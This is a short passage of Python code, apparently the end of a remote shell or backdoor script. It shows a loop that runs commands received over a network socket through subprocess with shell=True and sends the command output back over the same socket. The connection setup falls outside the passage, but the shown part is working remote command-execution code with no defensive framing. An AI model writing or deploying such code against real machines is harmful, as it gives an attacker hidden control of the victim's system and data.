        s.send(chariot + help_menu.encode('utf-8') + chariot)
    else:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        cmd = process.stdout.read() + process.stderr.read()
        s.send(chariot + cmd + chariot)
s.close()